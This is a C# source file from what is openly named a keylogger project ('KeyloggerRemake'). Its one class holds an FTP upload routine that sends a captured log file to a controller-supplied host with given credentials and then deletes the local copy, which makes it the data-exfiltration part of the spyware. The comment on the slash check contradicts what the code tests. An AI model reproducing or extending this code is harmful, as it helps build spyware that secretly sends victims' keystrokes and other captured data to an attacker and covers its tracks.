﻿using System;
using System.IO;
using System.Net;

namespace KeyloggerRemake
{
    static class classFTP
    {
        //To upload a log
        public static void uploadLog(string strHost, string strUser, string strPass, string strLogName, string strLogFile)
        { //Takes in the given host, user, pass (from the Controller), and log name and the file (full directory)
            string strUploadURL = strHost;

            //Checks if the host url ends with a '/' or not
            if (strUploadURL.LastIndexOf('/') != -1) //If it doesn't
            {
                strUploadURL += "/htdocs/";
            }
            else //If it does
            {
                strUploadURL += "htdocs/";
            }

            using (WebClient wc = new WebClient())
            {
                wc.Credentials = new NetworkCredential(strUser, strPass); //Gets the given credentials
                try
                {
                    wc.UploadFile(strUploadURL + strLogName, WebRequestMethods.Ftp.UploadFile, strLogFile); //Uploads the log onto the directory under the file name
                    File.Delete(strLogFile); //Disposes it
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
        }
    }
}
